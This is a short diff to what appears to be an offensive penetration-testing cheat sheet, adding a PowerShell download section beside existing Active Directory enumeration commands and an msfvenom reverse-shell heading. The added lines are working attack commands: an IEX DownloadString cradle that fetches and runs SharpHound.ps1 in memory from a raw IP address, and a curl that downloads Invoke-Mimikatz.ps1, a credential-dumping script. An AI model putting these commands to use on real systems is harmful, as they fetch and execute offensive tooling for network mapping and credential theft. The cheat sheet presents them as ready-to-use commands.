@@ -173,7 +173,16 @@ Get-Userproperty -properties sammacount
 get-netgpo
 get-netgpo -computer server01
 ```
-
+# POWERSHELL
+## DOWNLOAD
+##### POWERSHELL - DOWNLOAD AS STRING
+```
+IEX (New-Object System.Net.WebClient).DownloadString("http://175.12.80.10:8080/SharpHound.ps1")
+```
+##### POWERSHELL - DOWNLOAD CURL
+```
+curl https://github.com/samratashok/nishang/raw/master/Gather/Invoke-Mimikatz.ps1 -Outfile Invoke-Mimikatz.ps1
+```
 
 ## MSFVENOM
 ##### REVERSE SHELL - LINUX x64
